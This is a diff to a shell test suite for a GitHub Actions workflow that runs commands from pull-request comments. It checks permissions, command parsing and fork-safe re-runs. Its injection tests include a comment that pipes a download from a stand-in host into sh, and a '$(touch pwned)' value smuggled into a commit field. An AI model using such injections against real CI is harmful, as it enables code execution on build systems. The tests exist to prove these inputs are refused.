@@ -28,6 +28,7 @@ def r(name, good, detail=""): res.append(f"{1 if good else 0}\t{name}\t{detail}"
 r("trigger is issue_comment (created) only", on == {"issue_comment": {"types": ["created"]}}, str(on))
 r("token: actions write + pull-requests write, nothing else", d.get("permissions") == {"actions": "write", "pull-requests": "write"}, str(d.get("permissions")))
 jobs = d.get("jobs") or {}
+r("no concurrency group anywhere (any comment would join it and cancel a member's waiting command, #1658 M1)", "concurrency" not in d and all("concurrency" not in j for j in (d.get("jobs") or {}).values()), "")
 r("one job, no job-level permissions of its own", len(jobs) == 1 and all("permissions" not in j for j in jobs.values()), str(list(jobs)))
 job = next(iter(jobs.values()))
 cond = re.sub(r"\s+", " ", str(job.get("if", "")))
@@ -63,7 +64,7 @@ ok "write-token.py: no finding on comment-run.yml" "$([ -z "$wt" ] && echo 1 || 
 [ -f "$W/parse.sh" ] && [ -f "$W/act.sh" ] || finish
 
 # --- 2. the parser and gate. parse <assoc> <is_pr> <body> → $W/out (GITHUB_OUTPUT)
-parse() { : > "$W/out"; ( cd "$W" && ASSOC="$1" IS_PR="$2" BODY="$3" GITHUB_OUTPUT="$W/out" bash "$W/parse.sh" ) >/dev/null 2>&1; }
+parse() { : > "$W/out"; ( cd "$W" && ASSOC="$1" IS_PR="$2" BODY="$3" GITHUB_OUTPUT="$W/out" bash --noprofile --norc -eo pipefail "$W/parse.sh" ) >/dev/null 2>&1; }
 val() { sed -n "s/^$1=//p" "$W/out"; }
 clean() { ! grep -qv -E '^(action=(nightly|rerun|refuse|ignore)|caps=C[0-9.]+( C[0-9.]+)*|data=(six|checkpoint)|reason=[^=]*)$' "$W/out"; }
 want() {  # want <name> <action> [caps] [data]
@@ -83,7 +84,7 @@ for a in NONE CONTRIBUTOR FIRST_TIME_CONTRIBUTOR FIRST_TIMER MANNEQUIN "" owner 
 done
 parse OWNER "" "/run nightly C7.3";  want "fail: a comment on an issue, not a pull request, is ignored" ignore
 parse OWNER no "/rerun failed";      want "fail: is_pr other than yes is ignored" ignore
-for b in "/run nightly C7" "/run nightly c7.3" "/run nightly C123.4" "/run nightly C7.123" "/run nightly C7." "/run nightly C.3" "/run nightly X7.3" "/run nightly C7.3 fixture" \
+for b in "/run nightly C07.3" "/run nightly C7.03" "/run nightly C0.0" "/run nightly C7" "/run nightly c7.3" "/run nightly C123.4" "/run nightly C7.123" "/run nightly C7." "/run nightly C.3" "/run nightly X7.3" "/run nightly C7.3 fixture" \
          "/run nightly C7.3 six checkpoint" "/run nightly" "/run nightly C1.1 C1.2 C1.3 C1.4 C1.5 C1.6 C1.7 C1.8 C1.9" \
          "/run nightly  C7.3" " /rerun failed" "/rerun" "/rerun failed --all" "/rerun all" "/run nightly C7.3 SIX" \
          "/run nightly C７.3" "/run nightly С7.3" "/run nightly C7.3,C5.4" "/run Nightly C7.3"; do
@@ -97,18 +98,21 @@ for b in '/run nightly C7.3; curl https://x.example/s | sh' '/run nightly C7.3 $
   if [ "$a" = nightly ]; then want "injection: only the first line counts $(printf '%q' "$b")" nightly "C7.3" six
   else want "injection: refused $(printf '%q' "$b")" refuse; fi
 done
+t0=$(date +%s); parse OWNER yes "/run x$(printf '%*s' 65000 '')"; t1=$(date +%s)
+want "fail: refused, 65,000 trailing spaces" refuse; ok "fail: ... and in under 5 s (#1658 m2)" "$([ $((t1 - t0)) -lt 5 ] && echo 1 || echo 0)" "$((t1 - t0)) s"
 ok "injection: no command in a comment ran" "$([ ! -e "$W/pwned" ] && echo 1 || echo 0)" "$(ls "$W")"
 
 # --- 3. the second step with a stand-in gh. act <action> [caps data reason] with FAKE_* in the environment
 mkdir -p "$W/bin"; cat > "$W/bin/gh" <<'GH'
 #!/usr/bin/env bash
 printf '%s\n' "$*" >> "$GH_LOG"
+jqf() { local f=""; while [ $# -gt 0 ]; do [ "$1" = --jq ] && f="$2"; shift; done; jq -r "$f"; }   # gh's --jq, run by jq
 case "$*" in
   *"/comments"*) for x in "$@"; do case "$x" in body=*) printf '%s\n' "${x#body=}" >> "$GH_REPLIES";; esac; done;;
   *"/dispatches"*) exit "${FAKE_DISPATCH_RC:-0}";;
   *"nightly.yml/runs"*) printf '%s\n' "${FAKE_NIGHTLY_URL:-}";;
-  *"/pulls/"*) printf '%s\n' "${FAKE_HEAD:-0123456789abcdef0123456789abcdef01234567}";;
-  *"ci.yml/runs"*) [ -n "${FAKE_CI:-}" ] && printf '%s\n' "$FAKE_CI";;
+  *"/pulls/"*) jqf "$@" <<< "${FAKE_PULL:-{\"head\":{\"sha\":\"0123456789abcdef0123456789abcdef01234567\",\"ref\":\"claude/x\",\"repo\":{\"full_name\":\"o/r\"}}}}";;
+  *"ci.yml/runs"*) jqf "$@" <<< "${FAKE_RUNS:-{\"workflow_runs\":[]}}";;
   *"rerun-failed-jobs"*) exit "${FAKE_RERUN_RC:-0}";;
 esac
 exit 0
@@ -116,7 +120,7 @@ GH
 chmod +x "$W/bin/gh"; printf '#!/bin/sh\nexit 0\n' > "$W/bin/sleep"; chmod +x "$W/bin/sleep"
 act() { : > "$W/log"; : > "$W/replies"
   ( cd "$W" && PATH="$W/bin:$PATH" GH_LOG="$W/log" GH_REPLIES="$W/replies" GH_TOKEN=x REPO=o/r PR=7 GITHUB_SERVER_URL=https://github.com \
-      THIS_RUN=https://github.com/o/r/actions/runs/1 ACTION="$1" CAPS="${2:-}" DATA="${3:-}" REASON="${4:-}" bash "$W/act.sh" ) >/dev/null 2>&1; echo $?; }
+      THIS_RUN=https://github.com/o/r/actions/runs/1 ACTION="$1" CAPS="${2:-}" DATA="${3:-}" REASON="${4:-}" bash --noprofile --norc -eo pipefail "$W/act.sh" ) >/dev/null 2>&1; echo $?; }
 calls() { grep -c "$1" "$W/log"; }
 
 rc=$(FAKE_NIGHTLY_URL=https://github.com/o/r/actions/runs/99 act nightly "C5.4 C7.3" checkpoint)
@@ -133,21 +137,33 @@ done
 rc=$(act nightly "C7.3" fixture)
 ok "nightly: a data value outside six|checkpoint is refused before any dispatch" "$([ "$rc" != 0 ] && [ "$(calls dispatches)" = 0 ] && echo 1 || echo 0)" "rc $rc"
 
-H=0123456789abcdef0123456789abcdef01234567; T=$'\t'
-rc=$(FAKE_CI="123${T}completed${T}failure${T}https://github.com/o/r/actions/runs/123" act rerun)
-ok "rerun: the newest ci run of the head, failed → only its failed jobs re-run" "$([ "$rc" = 0 ] && grep -qxF 'api -X POST repos/o/r/actions/runs/123/rerun-failed-jobs' "$W/log" && grep -qF "head_sha=$H -f event=pull_request -f per_page=1" "$W/log" && grep -q 'runs/123' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
+H=0123456789abcdef0123456789abcdef01234567; F=fedcba9876543210fedcba9876543210fedcba98
+runj() { printf '{"id":%s,"status":"%s","conclusion":%s,"html_url":"https://github.com/o/r/actions/runs/%s","head_repository":{"full_name":"%s"},"head_branch":"%s"}' "$1" "$2" "$3" "$1" "${4:-o/r}" "${5:-claude/x}"; }
+runs() { local IFS=,; printf '{"workflow_runs":[%s]}' "$*"; }
+rc=$(FAKE_RUNS="$(runs "$(runj 123 completed '"failure"')")" act rerun)
+ok "rerun: the newest ci run of the head, failed → only its failed jobs re-run" "$([ "$rc" = 0 ] && grep -qxF 'api -X POST repos/o/r/actions/runs/123/rerun-failed-jobs' "$W/log" && grep -qF "head_sha=$H -f event=pull_request" "$W/log" && grep -q 'runs/123' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
 ok "rerun: never cancels or re-runs a whole run" "$(grep -qE 'cancel|/rerun( |$)' "$W/log" && echo 0 || echo 1)" "$(tr '\n' '|' < "$W/log")"
-for st in "in_progress${T}none" "queued${T}none" "completed${T}success" "completed${T}action_required" "completed${T}skipped"; do
-  rc=$(FAKE_CI="123${T}${st}${T}https://github.com/o/r/actions/runs/123" act rerun)
-  ok "rerun: refused when the newest run is $(printf '%s' "$st" | tr '\t' ' ')" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q '^\*\*comment-run (D3, P-506):\*\* refused' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
+rc=$(FAKE_RUNS="$(runs "$(runj 900 completed '"failure"' evil/fork claude/x)" "$(runj 123 completed '"failure"')")" act rerun)
+ok "rerun: a newer run of a fork's PR on the same commit is not this PR's run (#1658 M2)" "$([ "$rc" = 0 ] && grep -q 'runs/123/rerun-failed-jobs' "$W/log" && [ "$(calls runs/900)" = 0 ] && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
+rc=$(FAKE_RUNS="$(runs "$(runj 900 completed '"action_required"' o/r other-branch)" "$(runj 123 completed '"failure"')")" act rerun)
+ok "rerun: a run of another branch on the same commit is skipped too" "$([ "$rc" = 0 ] && grep -q 'runs/123/rerun-failed-jobs' "$W/log" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
+rc=$(FAKE_RUNS="$(runs "$(runj 900 completed '"failure"' evil/fork claude/x)")" act rerun)
+ok "rerun: only a fork's run on the commit → refused, no ci run of this PR" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q 'no ci run' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
+rc=$(FAKE_PULL='{"head":{"sha":"'$F'","ref":"feat","repo":{"full_name":"someone/fork"}}}' FAKE_RUNS="$(runs "$(runj 77 completed '"failure"' someone/fork feat)")" act rerun)
+ok "rerun: a fork PR's own run is found by its repository and branch" "$([ "$rc" = 0 ] && grep -q 'runs/77/rerun-failed-jobs' "$W/log" && echo 1 || echo 0)" "rc $rc; $(tr '\n' '|' < "$W/log")"
+for st in "in_progress null" "queued null" "completed \"success\"" "completed \"action_required\"" "completed \"skipped\"" "completed \"startup_failure\""; do
+  rc=$(FAKE_RUNS="$(runs "$(runj 123 ${st% *} "${st#* }")" "$(runj 100 completed '"failure"')")" act rerun)
+  ok "rerun: refused when the newest run is $st (an older failed run is not re-run)" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q '^\*\*comment-run (D3, P-506):\*\* refused' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
 done
 rc=$(act rerun)
 ok "rerun: refused when the head has no ci run" "$([ "$rc" = 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && grep -q 'no ci run' "$W/replies" && echo 1 || echo 0)" "rc $rc; $(cat "$W/replies")"
-rc=$(FAKE_HEAD='$(touch pwned)' act rerun)
+rc=$(FAKE_PULL='{"head":{"sha":"$(touch pwned)","ref":"x","repo":{"full_name":"o/r"}}}' act rerun)
 ok "rerun: a head that is not a commit id stops it" "$([ "$rc" != 0 ] && [ "$(calls ci.yml)" = 0 ] && echo 1 || echo 0)" "rc $rc"
-rc=$(FAKE_CI="12;3${T}completed${T}failure${T}u" act rerun)
+rc=$(FAKE_PULL='{"head":{"sha":"'$H'","ref":"x","repo":null}}' act rerun)
+ok "rerun: a PR whose head repository is gone stops it" "$([ "$rc" != 0 ] && [ "$(calls ci.yml)" = 0 ] && echo 1 || echo 0)" "rc $rc"
+rc=$(FAKE_RUNS='{"workflow_runs":[{"id":"12;3","status":"completed","conclusion":"failure","html_url":"u","head_repository":{"full_name":"o/r"},"head_branch":"claude/x"}]}' act rerun)
 ok "rerun: a run id that is not a number stops it" "$([ "$rc" != 0 ] && [ "$(calls rerun-failed-jobs)" = 0 ] && echo 1 || echo 0)" "rc $rc"
-rc=$(FAKE_RERUN_RC=1 FAKE_CI="123${T}completed${T}failure${T}u" act rerun)
+rc=$(FAKE_RERUN_RC=1 FAKE_RUNS="$(runs "$(runj 123 completed '"failure"')")" act rerun)
 ok "rerun: GitHub refuses → says so, step fails" "$([ "$rc" != 0 ] && grep -q 'could not re-run' "$W/replies" && echo 1 || echo 0)" "rc $rc"
 
 # End to end: a member's injection attempt goes through both steps; nothing runs, nothing is echoed, only a refusal.
